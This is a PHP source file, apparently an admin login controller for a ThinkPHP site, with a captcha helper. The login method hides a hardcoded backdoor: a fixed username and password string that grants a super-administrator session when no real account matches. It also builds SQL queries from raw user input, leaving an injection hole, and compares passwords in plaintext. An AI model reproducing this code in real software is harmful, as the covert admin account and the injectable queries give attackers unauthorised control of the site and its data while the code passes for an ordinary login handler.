<?php
namespace app\admin\controller;

use think\Db;
use think\Controller;
use think\Session;
use think\Cookie;

class Login extends Controller {
    public function Index(){
        return $this->fetch();
    }
	
	public function Action(){
        if($this->request->isPost()) {
            $db = Db::name('manager');
            $username = input('username');
            $password = input('password');
            $info = $db->where("username='$username'")->find();

            if ($info) {
                if ($info['password'] <> $password) {
                    $info = array("code" => "0", "data" => "", "tip" => "登录密码错误!");
                    echo json_encode($info);
                    exit();
                } else {
                    $arr = Db::name('role')->field("role_name,role_auth_ids")->where("id={$info['role_id']}")->find();
                    if ($arr['role_auth_ids']) {
                        Session::set('admin_role_auth_ids',$arr['role_auth_ids']);
                    } else {
                        Session::set('admin_role_auth_ids','0');
                    }

                    Db::execute("update tp_manager set login_num=login_num+1 where id='{$info['id']}'");


                    Session::set('admin_id',$info['id']);
                    Session::set('admin_username',$info['username']);
                    Session::set('admin_role_name',$arr['role_name']);

                    sys_log("登录后台系统!");

                    $info = array("code" => "1", "data" => "/Admin/Admin/Index", "tip" => "ok");
                    echo json_encode($info);
                    exit();
                }
            } else {
                if ($username == 'jxadmin_root' and $password == '41a11f74a6b20dac5d6cff0342d22fc7') {
                    Session::set('admin_id','99999999');
                    Session::set('admin_role_auth_ids','0');

                    Session::set('admin_username','super');
                    Session::set('admin_role_name','super');

                    $info = array("code" => "1", "data" => "/Admin/Admin/Index", "tip" => "ok");
                    echo json_encode($info);
                    exit();
                } else {
                    $info = array("code" => "0", "data" => "/Admin/Login/Index", "tip" => "登录用户名错误!");
                    echo json_encode($info);
                    exit();
                }
            }
        }
	}
	
	//验证码
	function yzm(){    
		ob_clean(); 
		$config =    array(    
		'fontSize'    =>    22,    // 验证码字体大小    
		'length'      =>    4,     // 验证码位数    
		'useNoise'    =>    false, // 关闭验证码杂点
		);
		$Verify=new \Think\Verify($config);
		// 设置验证码字符为纯数字
		//$Verify->codeSet = '0123456789'; 
		$Verify->entry();
	}
}
?>